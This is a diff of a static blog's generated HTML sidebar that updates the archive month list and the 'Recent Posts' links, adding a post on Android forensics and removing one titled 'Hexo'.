+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li></ul>
     </div>
   </div>
 
@@ -489,6 +746,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/">安卓取证</a>
+          </li>
         
           <li>
             <a href="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/">数据库原理与安全</a>
@@ -504,10 +765,6 @@
         
           <li>
             <a href="/2023/02/21/Windows%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">Windows与网络基础</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/13/Hexo/">Hexo</a>
           </li>
         
       </ul>
